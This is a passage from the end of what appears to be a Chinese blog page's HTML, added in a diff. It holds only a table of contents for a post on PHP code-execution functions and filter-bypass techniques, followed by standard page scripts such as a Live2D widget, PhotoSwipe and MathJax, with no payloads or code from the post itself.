+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-number">1.1.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-number">1.2.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-replace-e"><span class="toc-number">1.3.</span> <span class="toc-text">preg_replace()+&#x2F;e</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#create-function"><span class="toc-number">1.4.</span> <span class="toc-text">create_function()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">可回调函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map"><span class="toc-number">2.1.</span> <span class="toc-text">array_map()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func"><span class="toc-number">2.2.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">2.3.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-filter"><span class="toc-number">2.4.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#usort"><span class="toc-number">2.5.</span> <span class="toc-text">usort()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">字符串拼接绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">字符串转义绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%AC%A1%E4%BC%A0%E5%8F%82%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">多次传参绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%AE%BF%E9%97%AE%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">内置函数访问绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">异或绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">URL编码取反绕过</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+
+</html>
